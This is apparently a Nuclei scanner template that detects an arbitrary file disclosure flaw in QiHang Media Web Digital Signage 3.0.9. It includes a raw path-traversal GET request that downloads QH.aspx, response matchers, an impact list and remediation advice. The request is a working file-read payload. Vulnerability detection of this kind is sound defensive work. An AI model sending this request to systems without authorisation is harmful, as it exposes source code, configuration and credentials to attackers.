id: qihang-media-lfi

info:
  name: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure
  author: gy741
  severity: high
  description: |
    该模板用于检测 QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: qihang,lfi,disclosure,vuln

http:
  - raw:
      - |
        GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "filename=QH.aspx"
          - "application/zip"
        condition: and

      - type: word
        words:
          - "QH.aspx.cs"
          - "QiHang.Media.Web.QH"
        condition: and

      - type: status
        status:
          - 200
